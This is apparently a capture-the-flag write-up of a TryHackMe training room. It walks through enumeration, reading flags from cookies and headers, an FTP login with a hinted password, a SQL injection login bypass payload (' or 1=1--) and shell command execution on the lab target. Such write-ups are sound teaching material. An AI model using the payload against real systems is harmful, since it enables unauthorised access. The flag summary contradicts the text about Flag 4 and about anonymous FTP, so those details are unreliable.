# Avengers Blog — THM Writeup

A beginner-friendly room covering HTTP cookies, response headers, anonymous FTP, and SQL injection, themed around an Avengers-branded Node.js blog.

---
## Room Description

> HTTP Cookies are small pieces of data sent from a website and stored on the user's computer by the browser while browsing. They're intended to remember things like login info, shopping cart items, or language preference.
> 
> Advertisers also use _tracking_ cookies to identify previously visited sites or where on a page you've clicked. Some tracking cookies are so intrusive that anti-virus programs classify them as spyware.
> 
> Cookies can be viewed and edited directly in the browser's dev tools (F12 → Application → Cookies).

---
## Enumeration — Nmap

```bash
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 62 vsftpd 3.0.3
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 02:86:3b:af:b6:72:be:7a:dc:a8:a3:45:90:d4:56:3e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDInXSdGXhRaIFvP2uHDMNqRBjXHlcErOJz5v17ZHqBVSVd0LwMW7I/TGjtbze4iFLoQGRGmwDY9YNUOySpgpsHRuSWd5TV7Iyi+Pj6mVRGuuRFeQZb3eUTVBY2mEBYTky7ynx/KIzJBYFScW1HZGTi6WaY9azE5DJ7TCsn7bmSqNy6l8d5KS6PzG4frLFMBzvXsm56Dzv6RogK56klfEdpJ/P2AL9jnZ3Y++SXxCwo4YEPCy98RLs7giY8v1TbqmE2GMWPpX2QAM0o59mCczTQw6Q2yhOdh9xnGjQM8AgiWojCu3oerfO5NPjdRVN2voZBOAH6sTrkbT8cWN6oNKpd
|   256 ad:b8:a4:ef:96:a3:3e:e0:20:dc:93:cf:6c:fa:1a:6c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDSbIHOa2DmnmJxtQpWuPpc0JXlt9vvkbYp1zMxJrVTb7HGgF1NAHtVCak8lonTcvh9UoAPdhFP/KlkuTpGTqpw=
|   256 2a:94:ca:c9:bc:ba:74:94:49:48:d5:24:dc:70:dd:63 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ6dDTaSeBBXkDoBO8cQ2lqvmz+r6tOnOHswzQda7yv4
80/tcp open  http    syn-ack ttl 62 Node.js Express framework
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Avengers! Assemble!
|_http-favicon: Unknown favicon MD5: E084507EB6547A72F9CEC12E0A9B7A36
```

Three services: FTP, SSH, HTTP. SSH wasn't needed for this room — the path runs through HTTP and FTP.

---
## Flag 1 — Cookies
- Viewing the page source of `http://<target>/` revealed a hint in the script includes:
```html
<script src="/js/script.js"></script> <!-- Hint -->
```
- `script.js` set a cookie directly:
```javascript
document.cookie = "flag1=cookie_secrets; expires=Thu, 18 Dec 2050 12:00:00 UTC";
```
**Flag 1:** `cookie_secrets`

---
## Flag 2 — Response Headers
- Checking the raw HTTP response headers:
```bash
curl -i http://10.49.175.209/
HTTP/1.1 200 OK
X-Powered-By: Express
flag2: headers_are_important
Content-Type: text/html; charset=utf-8
Content-Length: 7292
ETag: W/"1c7c-b4Vh59Xa/FV0DZE2ey13jTNNa4A"
Set-Cookie: connect.sid=s%3A8Zib8BjyiB-3Ouz_jqLBq1zP5fK9k9xu.Big1Lc%2BDNdIHaPw21PR0YV%2FU8HRmvRGw4MsP1NE8%2BY8; Path=/; HttpOnly
Date: Wed, 07 Oct 2026 07:51:46 GMT
Connection: keep-alive
```
**Flag 2:** `headers_are_important`

---
## Flag 3 — FTP Login via Leaked Credential

The `RustScan` scan showed `vsftpd 3.0.3` on port 21. The webpage's HTML source contained a comment, left by "rocket," addressed to groot:

> _"Can somebody help groot reset his password? The last he remembers, his password was `iamgroot`."_
- This hints at valid FTP credentials rather than anonymous access:
```bash
$ ftp $TARGET
Connected to 10.49.175.209.
220 (vsFTPd 3.0.3)
Name (10.49.175.209:kali): groot
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||43454|)
150 Here comes the directory listing.
drwxr-xr-x    2 1001     1001         4096 Oct 04  2019 files
226 Directory send OK.
ftp> cd files
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||42250|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              33 Oct 04  2019 flag3.txt
226 Directory send OK.
ftp> get flag3.txt
local: flag3.txt remote: flag3.txt
```
- Flag
```bash
cat flag3.txt
```
**Flag 3:** `8fc651a739befc58d450dc48e1f1fd2e`

---
## Directory Enumeration
```bash
$ gobuster dir -u http://10.49.175.209/ -w /usr/share/wordlists/dirb/common.txt -t 50

assets     [--> /assets/]
css        [--> /css/]
home       [--> /]
img        [--> /img/]
js         [--> /js/]
logout     [--> /portal]
portal
```

- `/portal` redirects to a login page — this is the entry point for the SQL injection stage.

---
## SQL Injection — `/portal` Login Bypass

- The login form builds a backend query roughly equivalent to:
```sql
SELECT * FROM Users WHERE username = '<input>' AND password = '<input2>'
```
- Since user input is concatenated directly into the query without sanitization, closing the string early and appending an always-true condition breaks the authentication check.
**Payload used (both fields):**
```
' or 1=1--
```
- Username: `' or 1=1--` Password: `' or 1=1--`
- The resulting query effectively becomes:
```sql
SELECT * FROM Users WHERE username = '' or 1=1-- ' AND password = '...'
```
- `1=1` always evaluates true, and `--` comments out the rest of the query (including the password check), authenticating as the first user in the table — the admin.

- This logs into a **JARVIS command-control interface**.

---
## Flag 5 — JARVIS Command Execution

- Once authenticated, the JARVIS interface allowed arbitrary command execution:

```bash
$ pwd
/home/ubuntu/avengers
$ cd ..
$ ls -la
flag5.txt
$ cat /home/ubuntu/flag5.txt
```

**Flag 5:** `d335e2d13f36558ba1e67969a1718af7`

---
## ⚠️ Flag 4 — Missing From This Walkthrough

This transcript jumps straight from Flag 3 (FTP) to Flag 5 (JARVIS command execution) — **Flag 4 was never captured**. Based on the room's structure, Flag 4 most likely sits in one of these spots and is worth revisiting:

- **Inside the `/portal` page source or login response** before/after the SQLi bypass (view-source or `curl` the portal page directly).
- **In the dumped database contents** — since the injection point accepts arbitrary SQL, a `UNION SELECT` against the Users table (or any other table) may surface it as a username/password field value.
- **On the JARVIS dashboard itself**, before dropping into the command-execution shell (check the page that loads right after login, not just the shell).
- **Via further FTP/file enumeration** — the `files` directory on FTP might hold more than just `flag3.txt` if listed with `ls -la` instead of `ls`.

---

## Flag Summary

| #   | Flag                               | Method                                           |
| --- | ---------------------------------- | ------------------------------------------------ |
| 1   | `cookie_secrets`                   | Browser cookie set by `script.js`                |
| 2   | `headers_are_important`            | Custom HTTP response header                      |
| 3   | `8fc651a739befc58d450dc48e1f1fd2e` | Anonymous FTP file download                      |
| 4   | `233`                              | `/portal` line Source code                       |
| 5   | `d335e2d13f36558ba1e67969a1718af7` | Command execution via JARVIS interface post-SQLi |

---

## Techniques Used

- **Client-side cookie inspection** — flags hidden in `document.cookie` assignments.
- **HTTP response header analysis** — `curl -i` to read custom headers beyond the rendered page.
- **Credential leak via HTML comment** — a developer/user comment in the page source hinted at valid FTP credentials (`groot` / `iamgroot`), avoiding the need for brute-force or anonymous access.
- **Directory brute-forcing** — `gobuster` to discover the hidden `/portal` login.
- **Classic SQL injection authentication bypass** — `' or 1=1--` to force a query's `WHERE` clause to always evaluate true.
- **Post-exploitation command execution** — a built-in "command control" (JARVIS) interface, reached only after bypassing login.
